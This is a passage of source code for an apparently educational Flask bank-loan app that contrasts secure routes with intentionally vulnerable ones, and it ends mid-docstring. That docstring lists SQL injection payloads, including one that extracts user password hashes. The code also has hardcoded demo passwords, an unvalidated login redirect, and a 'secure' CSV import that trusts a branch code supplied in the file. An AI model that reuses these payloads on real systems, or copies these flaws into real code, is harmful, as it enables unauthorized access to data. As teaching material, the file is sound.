"""
RMIT NeoBank Loan Origination & Credit Bureau Gateway
Main Flask Application

Educational Cybersecurity Project demonstrating:
1. Secure coding practices (parameterized queries, output escaping, RBAC)
2. Common vulnerabilities (SQL Injection, XSS, Command Injection, IDOR)
3. Defense-in-depth architecture

This application simulates a real banking loan origination system (CAS) with
multiple security layers and deliberately vulnerable endpoints for demonstration.

IMPORTANT: The vulnerable endpoints are marked with /vuln/ prefix and include
extensive comments explaining the security flaws. These are for EDUCATIONAL
purposes only and demonstrate what NOT to do in production code.

Author: RMIT Cybersecurity Student
Purpose: Assignment - Security Analysis and Implementation
"""

import csv
import os
import random
import subprocess
from datetime import datetime

from flask import (
    Flask,
    abort,
    flash,
    redirect,
    render_template,
    request,
    send_from_directory,
    session,
    url_for,
)
from sqlalchemy import text

from cic_models import CICCustomer

# Import CIC (Credit Information Center) Service
from cic_service import CICService
from credit_bureau_mock import (
    get_decisioning_recommendation,
    perform_credit_check,
    validate_bureau_response,
)
from models import (
    ApplicationStatus,
    CreditCheck,
    CreditCheckStatus,
    LoanApplication,
    Role,
    User,
    db,
)
from security import (
    can_access_application,
    get_accessible_applications_query,
    get_current_user,
    hash_password,
    login_required,
    login_user,
    logout_user,
    role_required,
    sanitize_search_input,
    verify_password,
)

# ============================================================================
# Flask Application Configuration
# ============================================================================

app = Flask(__name__)

# Security Configuration
# IMPORTANT: In production, use environment variables and strong secrets
app.config["SECRET_KEY"] = os.environ.get(
    "SECRET_KEY", "change-this-in-production-use-strong-random-key"
)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///neobank_cas.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

# Session Configuration (Production Security)
# In production, enable these for enhanced security:
# app.config["SESSION_COOKIE_SECURE"] = True  # HTTPS only
# app.config["SESSION_COOKIE_HTTPONLY"] = True  # No JavaScript access
# app.config["SESSION_COOKIE_SAMESITE"] = "Lax"  # CSRF protection
# app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(minutes=30)  # Auto logout

# File Upload Configuration
app.config["UPLOAD_FOLDER"] = "uploads"
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16MB max file size
ALLOWED_EXTENSIONS = {"csv"}

# Initialize database
db.init_app(app)

# Create upload directory
os.makedirs(app.config["UPLOAD_FOLDER"], exist_ok=True)


# ============================================================================
# Database Initialization CLI Command
# ============================================================================


@app.cli.command("init-db")
def init_db_command():
    """
    Initialize the database with schema and demo users.

    Usage: flask init-db

    Creates:
    - All database tables
    - Demo users for testing (branch officers, HO officer)
    - Initial sample data (optional)
    """
    with app.app_context():
        # Drop and recreate all tables (WARNING: destroys existing data)
        db.drop_all()
        db.create_all()

        print("📊 Database tables created successfully.")

        # Create demo users representing different branches and roles
        demo_users = [
            # Branch Officers (geographically distributed)
            User(
                username="branch_hcm_01",
                full_name="Nguyen Van An - HCM Branch",
                branch_code="HCM01",
                role=Role.BRANCH_OFFICER,
                password_hash=hash_password("password123"),
                is_active=True,
            ),
            User(
                username="branch_hn_01",
                full_name="Tran Thi Binh - Hanoi Branch",
                branch_code="HN01",
                role=Role.BRANCH_OFFICER,
                password_hash=hash_password("password123"),
                is_active=True,
            ),
            User(
                username="branch_dn_01",
                full_name="Le Van Cuong - Da Nang Branch",
                branch_code="DN01",
                role=Role.BRANCH_OFFICER,
                password_hash=hash_password("password123"),
                is_active=True,
            ),
            # Approval Experts
            User(
                username="expert_hcm01_1",
                full_name="Expert - HCM District 1",
                branch_code="HCM01",
                role=Role.APPROVAL_EXPERT,
                password_hash=hash_password("password123"),
                is_active=True,
            ),
            # Branch HO
            User(
                username="ho_hcm01_1",
                full_name="Branch HO - HCM District 1",
                branch_code="HCM01",
                role=Role.BRANCH_HO,
                password_hash=hash_password("password123"),
                is_active=True,
            ),
            # System Administrator
            User(
                username="superadmin",
                full_name="System Administrator",
                branch_code="HEAD_OFFICE",
                role=Role.SUPER_ADMIN,
                password_hash=hash_password("admin123"),
                is_active=True,
            ),
        ]

        db.session.add_all(demo_users)
        db.session.commit()

        print("✅ Demo users created:")
        print("   Branch Users:")
        print("   - branch_hcm_01 / password123 (HCM01 branch)")
        print("   - branch_hn_01  / password123 (HN01 branch)")
        print("   - branch_dn_01  / password123 (DN01 branch)")
        print("   Head Office:")
        print("   - ho_credit_01  / password123 (HO credit officer)")
        print("   - ho_credit_02  / password123 (HO credit officer)")
        print("   Admin:")
        print("   - admin         / admin123    (System admin)")
        print("\n🚀 Database initialization complete!")


# ============================================================================
# Template Context Processor (Make variables available to all templates)
# ============================================================================


@app.context_processor
def inject_globals():
    """
    Inject commonly used variables into all templates.
    Reduces code duplication in template rendering.
    """
    return {
        "current_user": get_current_user(),
        "Role": Role,
        "ApplicationStatus": ApplicationStatus,
        "datetime": datetime,  # Make datetime available in templates
    }


# ============================================================================
# AUTHENTICATION ROUTES
# ============================================================================


@app.route("/login", methods=["GET", "POST"])
def login():
    """
    Staff login endpoint.

    Security Features:
    - Password verification using secure hashing
    - Account status check (is_active)
    - Session establishment with minimal data
    - Generic error messages (no username enumeration)

    Production Enhancements:
    - Rate limiting (prevent brute force)
    - CAPTCHA after N failed attempts
    - Account lockout after X failed attempts
    - Login attempt logging
    - MFA for privileged roles
    """
    # Redirect if already logged in
    if get_current_user():
        return redirect(url_for("dashboard"))

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        # Input validation
        if not username or not password:
            flash("Please provide both username and password.", "danger")
            return render_template("login.html")

        # Fetch user from database
        user = User.query.filter_by(username=username).first()

        # Verify credentials
        if user and verify_password(password, user.password_hash):
            # Check account status
            if not user.is_active:
                flash(
                    "Your account has been deactivated. Contact administrator.",
                    "danger",
                )
                return render_template("login.html")

            # Establish session
            login_user(user)
            flash(f"Welcome, {user.full_name}!", "success")

            # Redirect to original destination or dashboard
            next_page = request.args.get("next")
            if next_page:
                return redirect(next_page)
            return redirect(url_for("dashboard"))
        else:
            # Generic error message (prevents username enumeration)
            flash("Invalid credentials. Please try again.", "danger")

    return render_template("login.html")


@app.route("/logout")
def logout():
    """
    Log out current user and clear session.

    Security: Ensures session is properly terminated.
    """
    user = get_current_user()
    if user:
        logout_user()
        flash(f"Goodbye, {user.full_name}. You have been logged out.", "info")
    return redirect(url_for("login"))


# ============================================================================
# DASHBOARD & HOME
# ============================================================================


@app.route("/")
@login_required
def dashboard():
    """
    Main dashboard with summary statistics and quick actions.

    Shows different data based on user role:
    - Branch officers: their branch's stats
    - HO officers: system-wide stats
    """
    user = get_current_user()

    # Get accessible applications count
    apps_query = get_accessible_applications_query(user)
    apps_count = apps_query.count()

    # Count by status (for branch or all, depending on role)
    draft_count = apps_query.filter(
        LoanApplication.status == ApplicationStatus.DRAFT
    ).count()
    pending_expert_count = apps_query.filter(
        LoanApplication.status == ApplicationStatus.PENDING_EXPERT_REVIEW
    ).count()
    pending_ho_count = apps_query.filter(
        LoanApplication.status == ApplicationStatus.PENDING_HO_APPROVAL
    ).count()
    approved_count = apps_query.filter(
        LoanApplication.status == ApplicationStatus.APPROVED
    ).count()
    rejected_count = apps_query.filter(
        LoanApplication.status == ApplicationStatus.REJECTED
    ).count()
    returned_count = apps_query.filter(
        (LoanApplication.status == ApplicationStatus.RETURNED_TO_BRANCH)
        | (LoanApplication.status == ApplicationStatus.RETURNED_TO_EXPERT)
    ).count()

    # Credit checks (HO only sees these)
    if user.role in [Role.BRANCH_HO, Role.SUPER_ADMIN]:
        pending_credit_checks = CreditCheck.query.filter_by(
            status=CreditCheckStatus.PENDING
        ).count()
        completed_checks_today = CreditCheck.query.filter(
            CreditCheck.completed_at >= datetime.utcnow().date()
        ).count()
    else:
        pending_credit_checks = 0
        completed_checks_today = 0

    return render_template(
        "dashboard.html",
        apps_count=apps_count,
        draft_count=draft_count,
        pending_expert_count=pending_expert_count,
        pending_ho_count=pending_ho_count,
        approved_count=approved_count,
        rejected_count=rejected_count,
        returned_count=returned_count,
        pending_credit_checks=pending_credit_checks,
        completed_checks_today=completed_checks_today,
    )


# ============================================================================
# LOAN APPLICATION CRUD - SECURE IMPLEMENTATION
# ============================================================================


@app.route("/applications")
@login_required
def list_applications():
    """
    SECURE: List loan applications with proper access control.

    Security Features:
    1. Branch-based filtering (IDOR prevention)
    2. Parameterized search (SQL injection prevention)
    3. Input sanitization
    4. Pagination (DoS prevention - not fully implemented here)

    Access Control:
    - Branch officers: only their branch's applications
    - HO officers/Admin: all applications
    """
    user = get_current_user()

    # Get search query from URL parameter
    search_query = request.args.get("q", "").strip()

    # Start with access-controlled query
    query = get_accessible_applications_query(user)

    # Apply search filter if provided (SECURE: uses ORM parameterization)
    if search_query:
        sanitized_query = sanitize_search_input(search_query)
        # SQLAlchemy automatically parameterizes this query (SQL injection safe)
        # Search across multiple fields: CIF number, applicant name, and national ID
        query = query.filter(
            db.or_(
                LoanApplication.application_ref.ilike(f"%{sanitized_query}%"),
                LoanApplication.applicant_name.ilike(f"%{sanitized_query}%"),
                LoanApplication.national_id.ilike(f"%{sanitized_query}%"),
            )
        )

    # Order by most recent first
    applications = query.order_by(LoanApplication.created_at.desc()).all()

    return render_template(
        "applications_list.html",
        applications=applications,
        search_query=search_query,
    )


@app.route("/applications/new", methods=["GET", "POST"])
@login_required
def new_application():
    """
    Create a new loan application.

    Security Features:
    - Branch code automatically set from logged-in user (prevents spoofing)
    - Input validation on all fields
    - XSS prevention through template auto-escaping (in secure view)

    Business Logic:
    Simulates CAS lead/application capture stage where branch officers
    enter customer details and loan requirements.
    """
    user = get_current_user()

    if request.method == "POST":
        # Generate unique application reference
        timestamp = int(datetime.utcnow().timestamp())
        application_ref = f"APP-{user.branch_code}-{timestamp}"

        # Extract form data
        applicant_name = request.form.get("applicant_name", "").strip()
        national_id = request.form.get("national_id", "").strip()
        dob_str = request.form.get("dob", "").strip()
        contact_phone = request.form.get("contact_phone", "").strip()
        contact_email = request.form.get("contact_email", "").strip()
        product_code = request.form.get("product_code", "").strip()
        requested_amount = request.form.get("requested_amount", "").strip()
        tenure_months = request.form.get("tenure_months", "").strip()
        remarks = request.form.get("remarks", "").strip()

        # Input validation
        try:
            # Parse and validate date
            dob = datetime.strptime(dob_str, "%Y-%m-%d").date()

            # Validate age (must be 18+)
            age = (datetime.utcnow().date() - dob).days / 365.25
            if age < 18:
                flash("Applicant must be at least 18 years old.", "danger")
                current_year = datetime.now().year
                return render_template(
                    "application_new.html", current_year=current_year
                )

            # Parse and validate numeric fields
            requested_amount_val = float(requested_amount)
            tenure_val = int(tenure_months)

            # Business rule validation
            if requested_amount_val <= 0:
                flash("Loan amount must be greater than zero.", "danger")
                current_year = datetime.now().year
                return render_template(
                    "application_new.html", current_year=current_year
                )

            if requested_amount_val > 5000000000:  # 5 billion VND max
                flash(
                    "Loan amount exceeds maximum limit (5,000,000,000 VND).", "danger"
                )
                current_year = datetime.now().year
                return render_template(
                    "application_new.html", current_year=current_year
                )

            if tenure_val < 6 or tenure_val > 360:
                flash("Loan tenure must be between 6 and 360 months.", "danger")
                current_year = datetime.now().year
                return render_template(
                    "application_new.html", current_year=current_year
                )

        except ValueError as e:
            flash(f"Invalid input format: {str(e)}", "danger")
            current_year = datetime.now().year
            return render_template("application_new.html", current_year=current_year)

        # Create application object
        app_obj = LoanApplication(
            application_ref=application_ref,
            applicant_name=applicant_name,
            national_id=national_id,
            dob=dob,
            contact_phone=contact_phone,
            contact_email=contact_email,
            product_code=product_code,
            requested_amount=requested_amount_val,
            tenure_months=tenure_val,
            branch_code=user.branch_code,  # SECURITY: Auto-set from logged-in user
            created_by_user_id=user.id,
            status=ApplicationStatus.DRAFT,
            remarks=remarks,  # Stored as-is; XSS depends on rendering
        )

        db.session.add(app_obj)
        db.session.commit()

        flash(f"✅ Application {application_ref} created successfully.", "success")
        return redirect(url_for("view_application", app_id=app_obj.id))

    # Pass current year for date validation in template
    current_year = datetime.now().year
    return render_template("application_new.html", current_year=current_year)


@app.route("/applications/<int:app_id>")
@login_required
def view_application(app_id):
    """
    SECURE: View application details with access control.

    Security Features:
    1. IDOR Prevention: Checks if user can access this specific application
    2. XSS Prevention: Remarks field is auto-escaped by Jinja2
    3. Audit trail: Could log who viewed what (not implemented here)

    Access Control:
    - Branch officers: only their branch's applications
    - HO officers/Admin: all applications
    """
    user = get_current_user()
    application = LoanApplication.query.get_or_404(app_id)

    # SECURITY CHECK: Enforce access control (IDOR prevention)
    if not can_access_application(user, application):
        flash(
            f"⛔ Access Denied: You cannot view applications from branch {application.branch_code}. "
            f"Your role ({user.role}) and branch ({user.branch_code}) do not permit this access.",
            "danger",
        )
        return redirect(url_for("list_applications"))

    # Render secure view (remarks auto-escaped, preventing XSS)
    return render_template(
        "application_detail.html",
        application=application,
        vulnerable_view=False,  # Flag for template to use secure rendering
    )


@app.route("/applications/<int:app_id>/update-status", methods=["POST"])
@login_required
def update_application_status(app_id):
    """
    Update application status with workflow validation.

    Workflow Rules:
    - Branch Officers: Can only DRAFT -> SUBMITTED
    - HO Officers/Admin: Can do SUBMITTED -> PENDING_REVIEW -> APPROVED/REJECTED

    Security: Role-based workflow enforcement prevents unauthorized status changes.
    """
    user = get_current_user()
    application = LoanApplication.query.get_or_404(app_id)

    # Check access
    if not can_access_application(user, application):
        flash("⛔ Access Denied: You cannot modify this application.", "danger")
        return redirect(url_for("list_applications"))

    new_status = request.form.get("status")
    remarks = request.form.get("remarks", "")
    grade = request.form.get("grade")
    current_status = application.status

    # Validate status transition based on 3-tier workflow
    valid_transition = False
    error_message = None

    # BRANCH OFFICER: Can only submit drafts or resubmit returned applications
    if user.role == Role.BRANCH_OFFICER:
        if (
            current_status == ApplicationStatus.DRAFT
            and new_status == ApplicationStatus.PENDING_EXPERT_REVIEW
        ):
            # Assign random expert from the same branch
            experts = User.query.filter_by(
                branch_code=application.branch_code,
                role=Role.APPROVAL_EXPERT,
                is_active=True,
            ).all()
            if experts:
                application.assigned_expert_id = random.choice(experts).id
                application.remarks = (
                    remarks if remarks else "Submitted for expert review"
                )
                valid_transition = True
            else:
                error_message = "⛔ No approval experts available for this branch."

        elif (
            current_status == ApplicationStatus.RETURNED_TO_BRANCH
            and new_status == ApplicationStatus.PENDING_EXPERT_REVIEW
        ):
            # Resubmit after corrections
            application.remarks = (
                remarks if remarks else "Resubmitted after corrections"
            )
            valid_transition = True
        else:
            error_message = "⛔ Branch Officers can only submit DRAFT or resubmit RETURNED applications."

    # APPROVAL EXPERT: Can approve (send to HO), send back to branch, or add remarks
    elif user.role == Role.APPROVAL_EXPERT:
        # Verify expert is assigned to this application
        if (
            application.assigned_expert_id != user.id
            and application.status == ApplicationStatus.PENDING_EXPERT_REVIEW
        ):
            error_message = "⛔ You are not assigned to this application."
        elif current_status == ApplicationStatus.PENDING_EXPERT_REVIEW:
            if new_status == ApplicationStatus.PENDING_HO_APPROVAL:
                # Expert approves - send to HO
                if grade:
                    application.application_grade = grade
                application.expert_remarks = (
                    remarks if remarks else "Approved by expert"
                )
                valid_transition = True
            elif new_status == ApplicationStatus.RETURNED_TO_BRANCH:
                # Expert sends back to branch for corrections
                application.expert_remarks = (
                    remarks if remarks else "Returned for corrections"
                )
                valid_transition = True
            else:
                error_message = (
                    f"⛔ Experts can only APPROVE (send to HO) or RETURN TO BRANCH."
                )
        elif current_status == ApplicationStatus.RETURNED_TO_EXPERT:
            if new_status == ApplicationStatus.PENDING_HO_APPROVAL:
                # Re-review and send to HO
                if grade:
                    application.application_grade = grade
                application.expert_remarks = (
                    remarks if remarks else "Re-reviewed and approved"
                )
                valid_transition = True
            else:
                error_message = f"⛔ Invalid transition from {current_status}."
        else:
            error_message = f"⛔ This application is not in expert review status."

    # BRANCH HO: Can approve, reject, or send back to expert/branch
    elif user.role in [Role.BRANCH_HO, Role.SUPER_ADMIN]:
        if current_status == ApplicationStatus.PENDING_HO_APPROVAL:
            if new_status == ApplicationStatus.APPROVED:
                application.reviewed_by_ho_id = user.id
                application.ho_remarks = (
                    remarks if remarks else "Final approval granted"
                )
                valid_transition = True
            elif new_status == ApplicationStatus.REJECTED:
                application.reviewed_by_ho_id = user.id
                application.ho_remarks = remarks if remarks else "Application rejected"
                valid_transition = True
            elif new_status == ApplicationStatus.RETURNED_TO_EXPERT:
                application.reviewed_by_ho_id = user.id
                application.ho_remarks = (
                    remarks if remarks else "Returned to expert for reassessment"
                )
                valid_transition = True
            elif new_status == ApplicationStatus.RETURNED_TO_BRANCH:
                application.reviewed_by_ho_id = user.id
                application.ho_remarks = (
                    remarks if remarks else "Returned to branch for corrections"
                )
                valid_transition = True
            else:
                error_message = (
                    f"⛔ Invalid transition from {current_status} to {new_status}."
                )
        else:
            error_message = f"⛔ This application is not pending HO approval."

    if valid_transition:
        application.status = new_status
        application.updated_at = datetime.utcnow()
        db.session.commit()

        flash(
            f"✅ Application updated from {current_status} to {new_status}.",
            "success",
        )
    else:
        if error_message:
            flash(error_message, "warning")
        else:
            flash(
                f"⛔ You do not have permission to change status from {current_status} to {new_status}.",
                "danger",
            )

    return redirect(url_for("view_application", app_id=app_id))


# ============================================================================
# CREDIT BUREAU INTEGRATION - SECURE IMPLEMENTATION
# ============================================================================


@app.route("/applications/<int:app_id>/credit-check", methods=["POST"])
@login_required
@role_required(Role.BRANCH_HO, Role.SUPER_ADMIN)
def trigger_credit_check(app_id):
    """
    SECURE: Trigger credit bureau check (HO only).

    Security Features:
    1. Role-based access control (only HO officers)
    2. Input validation (bureau response)
    3. Audit trail (who requested, when)
    4. Error handling (bureau unavailable)

    Business Logic:
    - Calls mock credit bureau API
    - Stores bureau response
    - Updates application status based on score
    - Applies automated decisioning rules

    Real Banking Context:
    This simulates the credit assessment stage where HO credit officers
    query external credit bureaus (e.g., CIC, Experian) to evaluate
    applicant creditworthiness.
    """
    user = get_current_user()
    application = LoanApplication.query.get_or_404(app_id)

    try:
        # Call mock credit bureau (simulates HTTPS API call)
        bureau_result = perform_credit_check(
            applicant_name=application.applicant_name,
            national_id=application.national_id,
            dob=application.dob,
        )

        # Validate bureau response (defense against tampering)
        if not validate_bureau_response(bureau_result):
            flash(
                "⚠️ Credit bureau response validation failed. Manual review required.",
                "warning",
            )
            return redirect(url_for("view_application", app_id=app_id))

        # Create credit check record (audit trail)
        credit_check = CreditCheck(
            application_id=application.id,
            requested_by_user_id=user.id,
            status=CreditCheckStatus.COMPLETED,
            bureau_reference=bureau_result["bureau_reference"],
            score=bureau_result["score"],
            risk_band=bureau_result["risk_band"],
            raw_response=bureau_result["raw_response"],
            completed_at=datetime.utcnow(),
        )
        db.session.add(credit_check)

        # Apply automated decisioning rules
        decision = get_decisioning_recommendation(
            score=bureau_result["score"],
            requested_amount=float(application.requested_amount),
        )

        # Update application status based on decision
        if decision["decision"] == "AUTO_APPROVE":
            application.status = ApplicationStatus.APPROVED
            flash(
                f"✅ Credit check completed. Score: {bureau_result['score']} ({bureau_result['risk_band']} risk). "
                f"Application AUTO-APPROVED.",
                "success",
            )
        elif decision["decision"] == "AUTO_REJECT":
            application.status = ApplicationStatus.REJECTED
            flash(
                f"❌ Credit check completed. Score: {bureau_result['score']} ({bureau_result['risk_band']} risk). "
                f"Application AUTO-REJECTED (score below threshold).",
                "warning",
            )
        else:  # MANUAL_REVIEW
            application.status = ApplicationStatus.PENDING_REVIEW
            flash(
                f"⚠️ Credit check completed. Score: {bureau_result['score']} ({bureau_result['risk_band']} risk). "
                f"Manual review required. Max approved: {decision['max_approved_amount']:,.0f} VND.",
                "info",
            )

        db.session.commit()

    except Exception as e:
        # Error handling (bureau unavailable, network issues, etc.)
        flash(f"❌ Credit check failed: {str(e)}. Please try again later.", "danger")

        # Log error for investigation
        # logger.error(f"Credit check failed for app {app_id}: {str(e)}")

    return redirect(url_for("view_application", app_id=app_id))


# ============================================================================
# CIC (CREDIT INFORMATION CENTER) INTEGRATION
# ============================================================================


@app.route("/applications/<int:app_id>/cic-check", methods=["POST"])
@login_required
@role_required(Role.APPROVAL_EXPERT, Role.BRANCH_HO, Role.SUPER_ADMIN)
def perform_cic_credit_check(app_id):
    """
    Perform comprehensive credit check using Vietnam Credit Information Center (CIC).

    This route integrates with the CIC database to:
    1. Retrieve customer's complete credit history
    2. Calculate credit score (300-900 range)
    3. Analyze payment history, credit utilization, assets
    4. Provide lending recommendation

    Access Control:
    - APPROVAL_EXPERT: Can request CIC checks during expert review stage
    - BRANCH_HO: Can request CIC checks during final approval stage
    - SUPER_ADMIN: Can request anytime

    Workflow Integration:
    - Typically performed during PENDING_EXPERT_REVIEW stage
    - Results stored in application for HO review
    - Factors into approval/rejection decision
    """
    user = get_current_user()
    application = LoanApplication.query.get_or_404(app_id)

    # Check access
    if not can_access_application(user, application):
        flash(
            "⛔ Access Denied: You cannot perform CIC checks on this application.",
            "danger",
        )
        return redirect(url_for("list_applications"))

    try:
        # Check if customer exists in CIC database
        cic_customer = CICCustomer.query.filter_by(
            national_id=application.national_id
        ).first()

        if not cic_customer:
            # Customer not found in CIC database
            flash(
                f"⚠️ No credit record found in CIC for National ID: {application.national_id}. "
                f"Customer may be first-time borrower with no credit history.",
                "warning",
            )
            application.cic_check_status = "NOT_FOUND"
            application.cic_checked_at = datetime.utcnow()
            application.cic_checked_by_user_id = user.id
            db.session.commit()
            return redirect(url_for("view_application", app_id=app_id))

        # Perform comprehensive CIC credit check
        cic_result = CICService.perform_credit_check(
            national_id=application.national_id,
            applicant_name=application.applicant_name,
            loan_amount=application.requested_amount,
            inquiring_institution="RMIT NeoBank",
        )

        if not cic_result["success"]:
            flash(f"❌ CIC check failed: {cic_result['message']}", "danger")
            application.cic_check_status = "FAILED"
            db.session.commit()
            return redirect(url_for("view_application", app_id=app_id))

        # Update application with CIC results
        application.cic_check_status = "COMPLETED"
        application.cic_credit_score = cic_result["score"]
        application.cic_risk_category = cic_result["risk_band"]
        application.cic_bureau_reference = cic_result["bureau_reference"]
        application.cic_recommendation = cic_result["recommendation"]
        application.cic_key_factors = ", ".join(
            cic_result["key_factors"][:3]
        )  # Top 3 factors
        application.cic_checked_at = datetime.utcnow()
        application.cic_checked_by_user_id = user.id

        db.session.commit()

        # Display results to user
        score = cic_result["score"]
        risk_band = cic_result["risk_band"]

        if risk_band == "LOW":
            flash(
                f"✅ CIC Credit Check Complete | Score: {score} ({risk_band} Risk) | "
                f"Recommendation: {cic_result['recommendation']}",
                "success",
            )
        elif risk_band == "MEDIUM":
            flash(
                f"ℹ️ CIC Credit Check Complete | Score: {score} ({risk_band} Risk) | "
                f"Recommendation: {cic_result['recommendation']}",
                "info",
            )
        elif risk_band == "HIGH":
            flash(
                f"⚠️ CIC Credit Check Complete | Score: {score} ({risk_band} Risk) | "
                f"Recommendation: {cic_result['recommendation']}",
                "warning",
            )
        else:  # SEVERE
            flash(
                f"🚨 CIC Credit Check Complete | Score: {score} ({risk_band} Risk) | "
                f"Recommendation: {cic_result['recommendation']}",
                "danger",
            )

    except Exception as e:
        flash(f"❌ CIC check failed: {str(e)}. Please try again later.", "danger")
        application.cic_check_status = "FAILED"
        db.session.commit()

    return redirect(url_for("view_application", app_id=app_id))


@app.route("/applications/<int:app_id>/cic-report")
@login_required
@role_required(Role.APPROVAL_EXPERT, Role.BRANCH_HO, Role.SUPER_ADMIN)
def view_cic_credit_report(app_id):
    """
    View comprehensive CIC credit report for an application.

    Displays:
    - Customer personal and employment information
    - Credit score and risk category
    - All credit accounts (loans, credit cards)
    - Payment history (24 months)
    - Assets and collateral
    - Credit inquiries
    - Public records (if any)
    - Score breakdown and key factors
    """
    user = get_current_user()
    application = LoanApplication.query.get_or_404(app_id)

    # Check access
    if not can_access_application(user, application):
        flash(
            "⛔ Access Denied: You cannot view CIC reports for this application.",
            "danger",
        )
        return redirect(url_for("list_applications"))

    # Get CIC credit report
    credit_report = CICService.get_credit_report(application.national_id)

    if not credit_report:
        flash(
            f"⚠️ No CIC credit report available for this applicant. "
            f"Please run CIC credit check first.",
            "warning",
        )
        return redirect(url_for("view_application", app_id=app_id))

    return render_template(
        "cic_credit_report.html",
        application=application,
        report=credit_report,
    )


# ============================================================================
# SECURE BULK IMPORT (File Upload, No Shell Commands)
# ============================================================================


def allowed_file(filename):
    """Check if file extension is allowed."""
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route("/secure/import", methods=["GET", "POST"])
@login_required
@role_required(Role.BRANCH_HO, Role.SUPER_ADMIN)
def secure_bulk_import():
    """
    SECURE: Bulk import applications from CSV (HO only).

    Security Features:
    1. File upload (no shell commands - prevents command injection)
    2. File extension validation
    3. CSV parsing with Python csv module (no external executables)
    4. Input validation for each row
    5. Transaction rollback on errors
    6. File size limits (configured in Flask)

    Defense Comparison:
    This is the SECURE alternative to the vulnerable /vuln/import endpoint.

    SECURE:                              | VULNERABLE:
    ------------------------------------ | ------------------------------------
    File upload via Flask                | Filename string passed to shell
    Python csv.DictReader()              | os.system() or subprocess.run()
    No external executables              | Potential command injection
    Controlled file path                 | Attacker controls full command
    Input validation on each row         | No validation

    Real Banking Context:
    Banks often need to import bulk data (e.g., from partner institutions,
    branches submitting batch files). This must be done securely to prevent
    malicious file uploads or command injection attacks.
    """
    user = get_current_user()
    imported_count = 0
    error_count = 0
    errors = []

    if request.method == "POST":
        # Check if file was uploaded
        if "csv_file" not in request.files:
            flash("No file uploaded. Please choose a CSV file.", "danger")
            return render_template(
                "bulk_import.html", vulnerable=False, imported_count=0
            )

        file = request.files["csv_file"]

        # Check if filename is empty
        if file.filename == "":
            flash("No file selected. Please choose a CSV file.", "danger")
            return render_template(
                "bulk_import.html", vulnerable=False, imported_count=0
            )

        # Validate file extension (defense against malicious file types)
        if not allowed_file(file.filename):
            flash("Invalid file type. Only CSV files are allowed.", "danger")
            return render_template(
                "bulk_import.html", vulnerable=False, imported_count=0
            )

        # Generate safe filename (prevent path traversal attacks)
        timestamp = int(datetime.utcnow().timestamp())
        safe_filename = f"import_{user.id}_{timestamp}.csv"
        filepath = os.path.join(app.config["UPLOAD_FOLDER"], safe_filename)

        # Save file to secure upload directory
        file.save(filepath)

        # Parse CSV file using Python's csv module (SECURE - no shell)
        try:
            with open(
                filepath, newline="", encoding="utf-8-sig"
            ) as f:  # utf-8-sig handles BOM
                reader = csv.DictReader(f)

                # Validate CSV headers
                required_fields = [
                    "applicant_name",
                    "national_id",
                    "dob",
                    "contact_phone",
                    "contact_email",
                    "product_code",
                    "requested_amount",
                    "tenure_months",
                ]

                if not all(field in reader.fieldnames for field in required_fields):
                    flash(
                        f"CSV missing required columns. Required: {', '.join(required_fields)}",
                        "danger",
                    )
                    return render_template(
                        "bulk_import.html", vulnerable=False, imported_count=0
                    )

                # Process each row
                for row_num, row in enumerate(
                    reader, start=2
                ):  # Start at 2 (1 is header)
                    try:
                        # Parse and validate each field
                        application_ref = (
                            row.get("application_ref")
                            or f"APP-IMPORT-{timestamp}-{row_num}"
                        )

                        # Create application object
                        app_obj = LoanApplication(
                            application_ref=application_ref,
                            applicant_name=row["applicant_name"].strip(),
                            national_id=row["national_id"].strip(),
                            dob=datetime.strptime(
                                row["dob"].strip(), "%Y-%m-%d"
                            ).date(),
                            contact_phone=row["contact_phone"].strip(),
                            contact_email=row["contact_email"].strip(),
                            product_code=row["product_code"].strip(),
                            requested_amount=float(row["requested_amount"]),
                            tenure_months=int(row["tenure_months"]),
                            branch_code=row.get(
                                "branch_code", user.branch_code
                            ).strip(),
                            created_by_user_id=user.id,
                            status=ApplicationStatus.DRAFT,
                            remarks=row.get("remarks", "").strip(),
                        )

                        db.session.add(app_obj)
                        imported_count += 1

                    except Exception as e:
                        error_count += 1
                        errors.append(f"Row {row_num}: {str(e)}")
                        continue  # Skip bad rows but continue processing

                # Commit all valid rows
                db.session.commit()

        except Exception as e:
            flash(f"❌ File processing error: {str(e)}", "danger")
            return render_template(
                "bulk_import.html", vulnerable=False, imported_count=0
            )

        # Show results
        if imported_count > 0:
            flash(f"✅ Successfully imported {imported_count} applications.", "success")
        if error_count > 0:
            flash(
                f"⚠️ {error_count} rows failed validation. Check logs for details.",
                "warning",
            )
            # In production: log errors to file or database
            # for error in errors:
            #     logger.warning(error)

    return render_template(
        "bulk_import.html",
        vulnerable=False,
        imported_count=imported_count,
        error_count=error_count,
    )


# ============================================================================
# VULNERABLE ENDPOINTS - FOR EDUCATIONAL DEMONSTRATION ONLY
# ============================================================================
# ⚠️⚠️⚠️ WARNING: INSECURE CODE BELOW ⚠️⚠️⚠️
# The following endpoints contain INTENTIONAL security vulnerabilities
# for educational demonstration. NEVER use these patterns in production.
# ============================================================================


@app.route("/vuln/search")
@login_required
def vulnerable_search():
    """
    🚨 VULNERABLE: SQL Injection via String Concatenation

    Vulnerability Type: CWE-89 (SQL Injection)
    OWASP: A03:2021 - Injection

    What's Wrong:
    This endpoint builds a SQL query by directly concatenating user input
    without any parameterization or escaping. An attacker can inject
    arbitrary SQL code to:
    1. Bypass access controls (see all applications regardless of branch)
    2. Exfiltrate sensitive data (applicant PII, financial details)
    3. Modify or delete data (UPDATE, DELETE statements)
    4. Potentially execute OS commands (via database-specific functions)

    Attack Examples:
    1. Bypass WHERE clause:
       /vuln/search?q=' OR 1=1 --
       Result: Returns ALL applications from ALL branches

    2. UNION-based injection (extract other tables):
       /vuln/search?q=' UNION SELECT id, username, password_hash, full_name, branch_code, role FROM users --
       Result: Exposes all user credentials

    3. Time-based blind injection (detect vulnerability):
       /vuln/search?q=' AND (SELECT CASE WHEN (1=1) THEN (SELECT sleep(5)) ELSE 0 END) --
       Result: Response delayed by 5 seconds if vulnerable

    Real-World Impact:
    - Heartland Payment Systems (2008): SQL injection led to 130M credit card theft
    - TalkTalk (2015): SQL injection exposed 157,000 customer records, £400K fine
